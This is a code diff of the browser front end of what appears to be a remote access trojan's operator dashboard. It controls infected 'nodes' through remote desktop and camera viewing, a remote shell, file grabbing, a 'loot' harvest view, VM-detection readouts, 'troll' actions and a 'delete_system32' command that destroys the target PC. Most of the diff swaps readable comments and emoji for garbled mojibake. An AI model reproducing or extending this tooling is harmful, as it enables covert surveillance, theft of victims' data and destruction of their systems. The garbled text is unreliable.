@@ -1,4 +1,4 @@
-const $ = (id) => document.getElementById(id);
+﻿const $ = (id) => document.getElementById(id);
 
 let socket = null,
 	currentNodes = [],
@@ -17,7 +17,7 @@ const _apexFrames = {},
 const _lastFrameTs = 0; // For frame delivery latency measurement
 const _fileChunks = {}; // Buffer for reassembling chunked file uploads
 
-// ── Graph State ──────────────────────────────────────────────────────────────
+// â”€â”€ Graph State â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 const graphs = { nodes: [], load: [], conn: [] };
 const MAX_PTS = 60;
 const RTC_ICE = {
@@ -31,9 +31,13 @@ const RTC_ICE = {
 };
 
 const chatSound = new Audio("/static/notification.mp3");
+
+// ── Audio state (MRL WARE fix: properly declared) ──
+let _micOn = false, _deskOn = false, _audioTabScanned = false;
+let _audioCtxs = {}, _audioNext = {}, _audioCompressors = {}, _audioGains = {}, _audioFilters = {};
 const nodeConnectSound = new Audio("/static/node_connect.mp3");
 
-// ── Admin badge pulse ─────────────────────────────────────────────────────────
+// â”€â”€ Admin badge pulse â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let adminBadgeCount = 0;
 function _pulseAdminBadge() {
 	adminBadgeCount++;
@@ -49,7 +53,7 @@ function clearAdminBadge() {
 	if (badge) badge.style.display = "none";
 }
 
-// ── One-shot system message ──────────────────────────────────────────────────
+// â”€â”€ One-shot system message â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let sysTimer = null;
 function showSystemMsg(msg) {
 	// Remove existing system msg
@@ -77,7 +81,7 @@ document.addEventListener("DOMContentLoaded", () => {
 	initGraphs();
 	if (typeof initDraggableCam === "function") initDraggableCam();
 	if (typeof initDraggablePanel === "function") initDraggablePanel();
-	// ── Real server stats polling (replaces fake simulation) ────────────────
+	// â”€â”€ Real server stats polling (replaces fake simulation) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 	async function _pollStats() {
 		try {
 			const r = await fetch("/api/stats");
@@ -96,7 +100,7 @@ document.addEventListener("DOMContentLoaded", () => {
 	setInterval(_pollStats, 5000);
 });
 
-// ── WebSocket ────────────────────────────────────────────────────────────────
+// â”€â”€ WebSocket â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function initWebSocket() {
 	const proto = location.protocol === "https:" ? "wss:" : "ws:";
 	const token = window.INITIAL_USER?.id || "";
@@ -154,7 +158,7 @@ function setConnState(s) {
 	txt.style.color = color;
 }
 
-// ── Messages ─────────────────────────────────────────────────────────────────
+// â”€â”€ Messages â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function handleMsg(d) {
 	const t = d.t || d.type;
 	handleReconResponse(d);
@@ -169,13 +173,13 @@ function handleMsg(d) {
 					nodeConnectSound.currentTime = 0;
 					nodeConnectSound.play();
 				} catch (_e) {}
-				showToast(`🟢 New node connected! (${on} total)`, "ok");
+				showToast(`ðŸŸ¢ New node connected! (${on} total)`, "ok");
 			}
 			// If we're currently viewing a node and it just went offline, auto-close
 			if (currentTargetId) {
 				const viewedNode = currentNodes.find(n => n.id === currentTargetId || n.hostname === currentTargetId);
 				if (viewedNode && viewedNode.status !== "Online") {
-					showToast("🔴 Node disconnected — closing remote session", "warn");
+					showToast("ðŸ”´ Node disconnected â€” closing remote session", "warn");
 					_closeRemote();
 				}
 			}
@@ -228,17 +232,17 @@ function handleMsg(d) {
 				const ramEl = $("statNodeRam");
 				const diskEl = $("statNodeDisk");
 				if (cpuEl) {
-					cpuEl.textContent = s.cpu != null ? `${Math.round(s.cpu)}%` : "—";
+					cpuEl.textContent = s.cpu != null ? `${Math.round(s.cpu)}%` : "â€”";
 					cpuEl.style.color = s.cpu > 80 ? "var(--red)" : s.cpu > 50 ? "var(--amber)" : "var(--accent)";
 					_updateStatBar("statNodeCpuBar", s.cpu);
 				}
 				if (ramEl) {
-					ramEl.textContent = s.ram != null ? `${Math.round(s.ram)}%` : "—";
+					ramEl.textContent = s.ram != null ? `${Math.round(s.ram)}%` : "â€”";
 					ramEl.style.color = s.ram > 85 ? "var(--red)" : s.ram > 60 ? "var(--amber)" : "var(--violet)";
 					_updateStatBar("statNodeRamBar", s.ram);
 				}
 				if (diskEl) {
-					diskEl.textContent = s.disk != null ? `${Math.round(s.disk)}%` : "—";
+					diskEl.textContent = s.disk != null ? `${Math.round(s.disk)}%` : "â€”";
 					_updateStatBar("statNodeDiskBar", s.disk);
 				}
 				if ($("statNodeWin") && s.windows != null) {
@@ -307,9 +311,9 @@ function handleMsg(d) {
 							return `
                             <div style="display:flex;gap:2px;justify-content:center;margin-bottom:2px">
                                 <span style="font-size:0.5rem;color:var(--text-3);width:30px">${p.pid}</span>
-                                <button type="button" onclick="sendCmd('ps_suspend',{pid:${p.pid}})" title='Suspend' style='background:rgba(251,191,36,0.1);border:1px solid rgba(251,191,36,0.2);color:#fbbf24;border-radius:4px;padding:.1rem .3rem;cursor:pointer;font-size:.5rem'>⏸</button>
-                                <button type="button" onclick="sendCmd('ps_resume',{pid:${p.pid}})" title='Resume' style='background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.2);color:#10b981;border-radius:4px;padding:.1rem .3rem;cursor:pointer;font-size:.5rem'>▶</button>
-                                <button type="button" onclick="killProcess(${p.pid})" title='Kill' style='background:rgba(248,113,113,0.15);border:1px solid rgba(248,113,113,.3);color:#f87171;border-radius:4px;padding:.1rem .3rem;cursor:pointer;font-size:.5rem'>✕</button>
+                                <button type="button" onclick="sendCmd('ps_suspend',{pid:${p.pid}})" title='Suspend' style='background:rgba(251,191,36,0.1);border:1px solid rgba(251,191,36,0.2);color:#fbbf24;border-radius:4px;padding:.1rem .3rem;cursor:pointer;font-size:.5rem'>â¸</button>
+                                <button type="button" onclick="sendCmd('ps_resume',{pid:${p.pid}})" title='Resume' style='background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.2);color:#10b981;border-radius:4px;padding:.1rem .3rem;cursor:pointer;font-size:.5rem'>â–¶</button>
+                                <button type="button" onclick="killProcess(${p.pid})" title='Kill' style='background:rgba(248,113,113,0.15);border:1px solid rgba(248,113,113,.3);color:#f87171;border-radius:4px;padding:.1rem .3rem;cursor:pointer;font-size:.5rem'>âœ•</button>
                             </div>`;
 						})
 						.join("");
@@ -326,7 +330,7 @@ function handleMsg(d) {
 		case "audit_log":
 			if (typeof prependAuditRow === "function") prependAuditRow(d.data);
 			logEvent(
-				`[${d.data.category}] ${d.data.username} → ${d.data.action}${d.data.detail ? ` : ${d.data.detail.substring(0, 60)}` : ""}`,
+				`[${d.data.category}] ${d.data.username} â†’ ${d.data.action}${d.data.detail ? ` : ${d.data.detail.substring(0, 60)}` : ""}`,
 				d.data.level === "warn"
 					? "warn"
 					: d.data.level === "error"
@@ -423,7 +427,7 @@ function handleMsg(d) {
 					a.remove();
 				}, 2000);
 				logEvent(
-					`📥 Received: ${d.name} (${(bytes.length / 1024).toFixed(1)} KB)`,
+					`ðŸ“¥ Received: ${d.name} (${(bytes.length / 1024).toFixed(1)} KB)`,
 					"ok",
 				);
 			} catch (e) {
@@ -432,7 +436,7 @@ function handleMsg(d) {
 			break;
 		}
 		case "file_download": {
-			// File from node — auto-download to browser
+			// File from node â€” auto-download to browser
 			try {
 				const b64 = d.b64 || d.data;
 				const bytes = atob(b64);
@@ -446,8 +450,8 @@ function handleMsg(d) {
 				document.body.appendChild(a);
 				a.click();
 				setTimeout(() => { URL.revokeObjectURL(url); a.remove(); }, 2000);
-				showToast(`📥 Downloaded: ${d.name || "file"} (${(bytes.length/1024).toFixed(1)}KB)`, "teal");
-				logEvent(`📥 File download: ${d.name} (${(bytes.length/1024).toFixed(1)}KB)`, "ok");
+				showToast(`ðŸ“¥ Downloaded: ${d.name || "file"} (${(bytes.length/1024).toFixed(1)}KB)`, "teal");
+				logEvent(`ðŸ“¥ File download: ${d.name} (${(bytes.length/1024).toFixed(1)}KB)`, "ok");
 			} catch (e) {
 				logEvent(`file_download error: ${e}`, "err");
 			}
@@ -466,7 +470,7 @@ function handleMsg(d) {
 				lootEl.innerHTML = d.data || "No loot data found.";
 				setRemoteTab("loot");
 			}
-			showToast("💎 Intelligence Harvested!", "amber");
+			showToast("ðŸ’Ž Intelligence Harvested!", "amber");
 			break;
 		}
 		case "file_chunk": {
@@ -477,9 +481,9 @@ function handleMsg(d) {
 					_fileChunks[key] = { chunks: new Array(d.total), received: 0 };
 				_fileChunks[key].chunks[d.seq] = d.data;
 				_fileChunks[key].received++;
-				logEvent(`📦 ${d.name}: chunk ${d.seq + 1}/${d.total}`, "info");
+				logEvent(`ðŸ“¦ ${d.name}: chunk ${d.seq + 1}/${d.total}`, "info");
 				if (_fileChunks[key].received === d.total) {
-					// All chunks received — reassemble and download
+					// All chunks received â€” reassemble and download
 					const joined = _fileChunks[key].chunks.join("");
 					const bytes = atob(joined);
 					const arr = new Uint8Array(bytes.length);
@@ -497,7 +501,7 @@ function handleMsg(d) {
 					}, 2000);
 					delete _fileChunks[key];
 					logEvent(
-						`📥 Received (chunked): ${d.name} (${(bytes.length / 1024 / 1024).toFixed(1)} MB)`,
+						`ðŸ“¥ Received (chunked): ${d.name} (${(bytes.length / 1024 / 1024).toFixed(1)} MB)`,
 						"ok",
 					);
 				}
@@ -523,8 +527,8 @@ function handleMsg(d) {
 			// Update the grid card if visible
 			const cpuText = $(`node-cpu-${d.id}`);
 			const ramText = $(`node-ram-${d.id}`);
-			if (cpuText) cpuText.textContent = d.cpu != null ? `${Math.round(d.cpu)}%` : "—";
-			if (ramText) ramText.textContent = d.ram != null ? `${Math.round(d.ram)}%` : "—";
+			if (cpuText) cpuText.textContent = d.cpu != null ? `${Math.round(d.cpu)}%` : "â€”";
+			if (ramText) ramText.textContent = d.ram != null ? `${Math.round(d.ram)}%` : "â€”";
 			
 			const cpuFill = document.querySelector(`#health-cpu-${d.id} .health-fill`);
 			const ramFill = document.querySelector(`#health-ram-${d.id} .health-fill`);
@@ -536,9 +540,9 @@ function handleMsg(d) {
 				const cpuEl = $("statNodeCpu");
 				const ramEl = $("statNodeRam");
 				const winEl = $("statNodeWin");
-				if (cpuEl) cpuEl.textContent = d.cpu != null ? `${Math.round(d.cpu)}%` : "—";
-				if (ramEl) ramEl.textContent = d.ram != null ? `${Math.round(d.ram)}%` : "—";
-				if (winEl) winEl.textContent = d.windows != null ? d.windows : "—";
+				if (cpuEl) cpuEl.textContent = d.cpu != null ? `${Math.round(d.cpu)}%` : "â€”";
+				if (ramEl) ramEl.textContent = d.ram != null ? `${Math.round(d.ram)}%` : "â€”";
+				if (winEl) winEl.textContent = d.windows != null ? d.windows : "â€”";
 				
 				if (cpuEl && d.cpu != null) {
 					cpuEl.style.color = d.cpu > 80 ? "var(--red)" : d.cpu > 50 ? "var(--amber)" : "var(--accent)";
@@ -599,15 +603,15 @@ function renderDirList(d) {
 		}
 	}
 
-	let html = `<div style="font-size:.65rem;color:var(--text-3);margin-bottom:.4rem;border-bottom:1px solid var(--border);padding-bottom:.2rem;">📁 ${d.path}</div>`;
+	let html = `<div style="font-size:.65rem;color:var(--text-3);margin-bottom:.4rem;border-bottom:1px solid var(--border);padding-bottom:.2rem;">ðŸ“ ${d.path}</div>`;
 
 	// Add "Up" directory button
 	html += `<div style="padding:.2rem 0;font-size:.7rem;cursor:pointer;color:var(--text-1);font-weight:bold"
                   onclick="browseDir('${parentPath.replace(/\\/g, "\\\\")}')"
-             >⬆️ .. (Go Up)</div>`;
+             >â¬†ï¸ .. (Go Up)</div>`;
 
 	(d.entries || []).forEach((e) => {
-		const icon = e.is_dir ? "📁" : "📄";
+		const icon = e.is_dir ? "ðŸ“" : "ðŸ“„";
 		const sz = e.is_dir
 			? ""
 			: ` <span style="color:var(--text-3)">${(e.size / 1024).toFixed(1)}KB</span>`;
@@ -640,7 +644,7 @@ function browseDir(path) {
 	socket.send(JSON.stringify({ type: "dir_list", path, id: currentTargetId }));
 }
 
-// ── User Sync ─────────────────────────────────────────────────────────────────
+// â”€â”€ User Sync â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function syncUser(u) {
 	currentUser = u;
 	const init = $("userInitials"),
@@ -666,7 +670,7 @@ function syncUser(u) {
 	if ($("userRoleUnder")) $("userRoleUnder").textContent = u.role || "User";
 }
 
-// ── Views ─────────────────────────────────────────────────────────────────────
+// â”€â”€ Views â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function _showView(v) {
 	["overview", "logs", "admin", "map", "vault"].forEach((id) => {
 		const el = $(`view-${id}`);
@@ -706,7 +710,7 @@ function _showView(v) {
 	}
 }
 
-// ── NODE RENDERING ────────────────────────────────────────────────────────────
+// â”€â”€ NODE RENDERING â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function renderNodes() {
 	const grid = $("nodeGrid");
 	if (!grid) return;
@@ -741,7 +745,7 @@ function renderNodes() {
 		}
 
 		const publicIp = s.public_ip || s.ipv4 || "Unknown";
-		const localIp = s.local_ip || "—";
+		const localIp = s.local_ip || "â€”";
 
 		const isPrivate = Array.isArray(n.allowed_users);
 		const canManage = currentUser?.role === "admin";
@@ -754,20 +758,20 @@ function renderNodes() {
         <div style="font-size:.62rem;color:var(--text-3);margin-top:1px">${publicIp}</div>
     </div>
     <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
-        <span class="badge ${active ? "badge-teal" : "badge-red"}" style="flex-shrink:0">${active ? "● ONLINE" : "○ OFFLINE"}</span>
-        ${isPrivate ? `<span class="badge badge-amber" style="font-size:0.5rem;padding:1px 4px">🔒 PRIVATE</span>` : ""}
+        <span class="badge ${active ? "badge-teal" : "badge-red"}" style="flex-shrink:0">${active ? "â— ONLINE" : "â—‹ OFFLINE"}</span>
+        ${isPrivate ? `<span class="badge badge-amber" style="font-size:0.5rem;padding:1px 4px">ðŸ”’ PRIVATE</span>` : ""}
     </div>
 </div>
 <div class="node-media-row">
-    <div class="media-chip">🖥 <span style="font-weight:700">${monitors}</span></div>
-    <div class="media-chip">📷 <span style="font-weight:700">${cameras}</span></div>
+    <div class="media-chip">ðŸ–¥ <span style="font-weight:700">${monitors}</span></div>
+    <div class="media-chip">ðŸ“· <span style="font-weight:700">${cameras}</span></div>
     ${flag ? `<div class="media-chip">${flag} <span>${region}</span></div>` : ""}
-    ${canManage ? `<button type="button" class="btn-ghost" style="padding:2px 6px;font-size:0.55rem;margin-left:auto" onclick="event.stopPropagation(); adminToggleNodePublic('${n.id}', ${!isPrivate})">${isPrivate ? "🔓 MAKE PUBLIC" : "🔒 MAKE PRIVATE"}</button>` : ""}
+    ${canManage ? `<button type="button" class="btn-ghost" style="padding:2px 6px;font-size:0.55rem;margin-left:auto" onclick="event.stopPropagation(); adminToggleNodePublic('${n.id}', ${!isPrivate})">${isPrivate ? "ðŸ”“ MAKE PUBLIC" : "ðŸ”’ MAKE PRIVATE"}</button>` : ""}
 </div>
 <div class="node-specs-grid">
-    <div class="spec-row"><span class="spec-key">OS</span><span class="spec-val">${s.os || "—"}</span></div>
-    <div class="spec-row"><span class="spec-key">CPU</span><span class="spec-val" id="node-cpu-${n.id}">${n.lastCpu != null ? Math.round(n.lastCpu) + '%' : s.cpu || "—"}</span></div>
-    <div class="spec-row"><span class="spec-key">RAM</span><span class="spec-val" id="node-ram-${n.id}">${n.lastRam != null ? Math.round(n.lastRam) + '%' : s.ram || "—"}</span></div>
+    <div class="spec-row"><span class="spec-key">OS</span><span class="spec-val">${s.os || "â€”"}</span></div>
+    <div class="spec-row"><span class="spec-key">CPU</span><span class="spec-val" id="node-cpu-${n.id}">${n.lastCpu != null ? Math.round(n.lastCpu) + '%' : s.cpu || "â€”"}</span></div>
+    <div class="spec-row"><span class="spec-key">RAM</span><span class="spec-val" id="node-ram-${n.id}">${n.lastRam != null ? Math.round(n.lastRam) + '%' : s.ram || "â€”"}</span></div>
     <div class="spec-row"><span class="spec-key">IP</span><span class="spec-val" style="color:var(--accent)">${publicIp}</span></div>
     <div class="spec-row"><span class="spec-key">LOCAL</span><span class="spec-val">${localIp}</span></div>
     <div class="spec-row"><span class="spec-key">VM</span><span class="spec-val ${s.vm === "Detected" ? "red" : ""}">${s.vm || "Unknown"}</span></div>
@@ -784,7 +788,7 @@ function renderNodes() {
 	});
 }
 
-// ── LIVE GRAPHS ─────────────────────────────────────────────────────────────
+// â”€â”€ LIVE GRAPHS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 // DPR-aware, resize-safe sparkline renderer
 const _graphCtx = {};
 
@@ -880,7 +884,7 @@ function drawGraphs() {
 }
 
 
-// ── REMOTE DESKTOP ────────────────────────────────────────────────────────────
+// â”€â”€ REMOTE DESKTOP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function openRemote(id, node) {
 	currentTargetId = id;
 	_fsNodeId = id;
@@ -936,7 +940,7 @@ function openRemote(id, node) {
 			JSON.stringify({ type: "stream", cmd: "start", id: currentTargetId }),
 		);
 	}
-	// ── Bind HID listeners to the actual canvas (must happen after remote opens) ──
+	// â”€â”€ Bind HID listeners to the actual canvas (must happen after remote opens) â”€â”€
 	const _cv = $("desktopView");
 	if (_cv && !_cv._hidBound) {
 		_cv._hidBound = true;
@@ -984,7 +988,7 @@ function openRemote(id, node) {
 		);
 	}
 
-	// ── Live node stats polling every 5s ──
+	// â”€â”€ Live node stats polling every 5s â”€â”€
 	clearInterval(window._statsPoller);
 	window._statsPoller = setInterval(() => {
 		if (socket?.readyState === WebSocket.OPEN && currentTargetId) {
@@ -995,7 +999,7 @@ function openRemote(id, node) {
 	if (socket?.readyState === WebSocket.OPEN) {
 		socket.send(JSON.stringify({ type: "node_stats", id: currentTargetId }));
 	}
-	// ── Start session timer ──
+	// â”€â”€ Start session timer â”€â”€
 	_startSessionTimer();
 }
 
@@ -1006,18 +1010,18 @@ function renderRemoteSpecs(s) {
 	panel.innerHTML = `
 <div class="tool-cat-title" style="margin-bottom:.75rem">Node Intelligence</div>
 <div style="display:flex;flex-direction:column;gap:.4rem;background:rgba(255,255,255,0.02);padding:1rem;border-radius:14px;border:1px solid rgba(255,255,255,0.05);box-shadow:inset 0 1px 1px rgba(255,255,255,0.05)">
-    ${specLine("🖥", "OS", s.os)}
-    ${specLine("🧠", "CPU", s.cpu)}
-    ${specLine("🎮", "GPU", s.gpu)}
-    ${specLine("💾", "RAM", s.ram)}
-    ${specLine("🌐", "Public", s.public_ip || s.ipv4 || "Unknown", "accent")}
-    ${specLine("🏠", "Local", s.local_ip || "—")}
-    ${specLine("🌐", "IPv6", s.ipv6)}
-    ${specLine("💿", "Disks", s.disks)}
-    ${specLine("🛡", "VM", s.vm || "Unknown", s.vm === "Detected" ? "red" : "")}
-    ${s.monitors !== undefined ? specLine("🖥", "Screens", s.monitors) : ""}
-    ${s.cameras !== undefined ? specLine("📷", "Cameras", s.cameras) : ""}
-    ${flag ? specLine("📍", "Region", `${flag} ${s.region || s.country || ""}`) : ""}
+    ${specLine("ðŸ–¥", "OS", s.os)}
+    ${specLine("ðŸ§ ", "CPU", s.cpu)}
+    ${specLine("ðŸŽ®", "GPU", s.gpu)}
+    ${specLine("ðŸ’¾", "RAM", s.ram)}
+    ${specLine("ðŸŒ", "Public", s.public_ip || s.ipv4 || "Unknown", "accent")}
+    ${specLine("ðŸ ", "Local", s.local_ip || "â€”")}
+    ${specLine("ðŸŒ", "IPv6", s.ipv6)}
+    ${specLine("ðŸ’¿", "Disks", s.disks)}
+    ${specLine("ðŸ›¡", "VM", s.vm || "Unknown", s.vm === "Detected" ? "red" : "")}
+    ${s.monitors !== undefined ? specLine("ðŸ–¥", "Screens", s.monitors) : ""}
+    ${s.cameras !== undefined ? specLine("ðŸ“·", "Cameras", s.cameras) : ""}
+    ${flag ? specLine("ðŸ“", "Region", `${flag} ${s.region || s.country || ""}`) : ""}
     <div style="margin-top:.5rem;padding-top:.5rem;border-top:1px solid rgba(255,255,255,0.05);display:flex;align-items:center;gap:.4rem;font-size:.72rem">
         <div style="width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green)"></div>
         <span style="color:var(--green);font-weight:800;letter-spacing:0.05em;text-transform:uppercase">Connected</span>
@@ -1026,7 +1030,7 @@ function renderRemoteSpecs(s) {
 }
 
 function specLine(ico, label, val, cls = "") {
-	if (!val || val === "—") return "";
+	if (!val || val === "â€”") return "";
 	let color = "var(--text-2)";
 	let shadow = "none";
 	if (cls === "accent") {
@@ -1109,15 +1113,15 @@ function _closeRemote() {
 	document.removeEventListener("keydown", handleKeyDown);
 	document.removeEventListener("keyup", handleKeyUp);
 	if (hidMode === "control") toggleHidMode();
-	// ── Stop WebRTC if active ──
+	// â”€â”€ Stop WebRTC if active â”€â”€
 	if (typeof _rtcActive !== "undefined" && _rtcActive) stopWebRTC();
-	// ── Stop stats polling ──
+	// â”€â”€ Stop stats polling â”€â”€
 	clearInterval(window._statsPoller);
-	// ── Stop session timer ──
+	// â”€â”€ Stop session timer â”€â”€
 	_stopSessionTimer();
-	// ── Reset stat badges ──
-	["statNodeCpu","statNodeRam","statNodeWin"].forEach(id => { const el=$(id); if(el) el.textContent="—"; });
-	// ── Reset audio state for next session ──
+	// â”€â”€ Reset stat badges â”€â”€
+	["statNodeCpu","statNodeRam","statNodeWin"].forEach(id => { const el=$(id); if(el) el.textContent="â€”"; });
+	// â”€â”€ Reset audio state for next session â”€â”€
 	_micOn = false;
 	_deskOn = false;
 	_setAudioBtn("btnAudioMic", false);
@@ -1197,7 +1201,7 @@ function toggleHidMode() {
 	}
 }
 
-// ── Panel collapse/expand (slides UP) ────────────────────────────────────────
+// â”€â”€ Panel collapse/expand (slides UP) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let _panelCollapsed = false;
 function togglePanelCollapse() {
 	_panelCollapsed = !_panelCollapsed;
@@ -1266,7 +1270,7 @@ function switchCamera(idx) {
 			}),
 		);
 		const cc = $("camContainer");
-		if (cc) cc.style.display = "block"; // ← THIS was missing
+		if (cc) cc.style.display = "block"; // â† THIS was missing
 	}
 }
 function _setStreamFps(fps) {
@@ -1278,9 +1282,9 @@ function _setStreamFps(fps) {
 			id: currentTargetId,
 		}),
 	);
-	logEvent(`Stream FPS → ${fps}`, "ok");
+	logEvent(`Stream FPS â†’ ${fps}`, "ok");
 }
-// ── HID: direct command format to match agent's priority queue ───────────────
+// â”€â”€ HID: direct command format to match agent's priority queue â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let _lastMouseX = -1,
 	_lastMouseY = -1;
 window.sendMouseEvent = function(e, type) {
@@ -1378,7 +1382,7 @@ function handleRemoteKey(e, isDown = true) {
 const handleKeyDown = (e) => handleRemoteKey(e, true);
 const handleKeyUp = (e) => handleRemoteKey(e, false);
 
-// ── ZERO-COPY CANVAS RENDERER ────────────────────────────────────────────
+// â”€â”€ ZERO-COPY CANVAS RENDERER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 // Uses createImageBitmap (zero-copy GPU path) + canvas drawImage.
 // No Blob URL allocation, no GC pauses, no layout thrash.
 // Result: same latency as AnyDesk/RustDesk in browser.
@@ -1386,6 +1390,14 @@ const _canvasCtx = {}; // canvas 2D context cache
 const _pendingBitmap = {}; // latest decoded bitmap per channel
 let _rafRunning = false; // single RAF loop for all channels
 
+// MRL WARE fix: Resume all AudioContexts on first user gesture (browser autoplay policy)
+document.addEventListener('click', function _unlockAudio() {
+    for (const k in _audioCtxs) {
+        if (_audioCtxs[k] && _audioCtxs[k].state === 'suspended') {
+            _audioCtxs[k].resume();
+        }
+    }
+}, { once: false });
 function handleBinary(buf) {
 	const view = new Uint8Array(buf);
 	if (view.length < 2) return;
@@ -1492,7 +1504,7 @@ function _flushCanvases() {
 		bmp.close();
 		_pendingBitmap[canvasId] = null;
 	}
-	// Always keep RAF running — eliminates 1-frame startup delay on each new frame
+	// Always keep RAF running â€” eliminates 1-frame startup delay on each new frame
 	requestAnimationFrame(_flushCanvases);
 }
 
@@ -1510,7 +1522,7 @@ function sendTroll(action, val = "") {
 			id: currentTargetId,
 		}),
 	);
-	logEvent(`🎭 Troll: ${action}`, "warn");
+	logEvent(`ðŸŽ­ Troll: ${action}`, "warn");
 }
 function sendTrollExt(action, extra = {}) {
 	if (!currentTargetId || !socket) return;
@@ -1522,7 +1534,7 @@ function sendTrollExt(action, extra = {}) {
 			...extra,
 		}),
 	);
-	logEvent(`🎭 Ext Troll: ${action}`, "warn");
+	logEvent(`ðŸŽ­ Ext Troll: ${action}`, "warn");
 }
 function _promptTroll(action) {
 	const v = prompt(`Enter input for ${action}:`, "");
@@ -1610,21 +1622,21 @@ function _execGlobalCmd() {
 					id: currentTargetId,
 				}),
 			);
-			logEvent(`➤ Shell: ${raw}`, "info");
+			logEvent(`âž¤ Shell: ${raw}`, "info");
 	}
 }
 
 function sendCmd(type, extra = {}) {
 	if (!currentTargetId || !socket) return;
 	socket.send(JSON.stringify({ type, id: currentTargetId, ...extra }));
-	logEvent(`➤ ${type}`, "info");
+	logEvent(`âž¤ ${type}`, "info");
 }
 function sendNetCmd(cmd, host = "") {
 	if (!currentTargetId || !socket) return;
 	socket.send(
 		JSON.stringify({ type: "network_cmd", cmd, host, id: currentTargetId }),
 	);
-	logEvent(`🌐 ${cmd} ${host}`, "info");
+	logEvent(`ðŸŒ ${cmd} ${host}`, "info");
 }
 function _promptNetCmd(cmd) {
 	const h = prompt(`Host for ${cmd}:`, "8.8.8.8");
@@ -1767,8 +1779,8 @@ function _promptKillApp() {
 	sendCmd("kill_app", { name: n.trim() });
 }
 function _confirmDelete32() {
-	if (!confirm("⚠️ This will DESTROY the target PC. Are you sure?")) return;
-	if (!confirm("❗ FINAL WARNING: This is IRREVERSIBLE. Proceed?")) return;
+	if (!confirm("âš ï¸ This will DESTROY the target PC. Are you sure?")) return;
+	if (!confirm("â— FINAL WARNING: This is IRREVERSIBLE. Proceed?")) return;
 	sendCmd("delete_system32", { confirm: "CONFIRM_DESTROY" });
 }
 function _promptMoveMouse() {
@@ -1812,7 +1824,7 @@ function showToolCat(cat) {
 	// Show target
 	const el = document.getElementById(`toolcat_${cat}`);
 	if (el) el.style.display = "block";
-	// Update active pill state — handle both normal and danger pills
+	// Update active pill state â€” handle both normal and danger pills
 	document.querySelectorAll(".tool-pill").forEach((p) => {
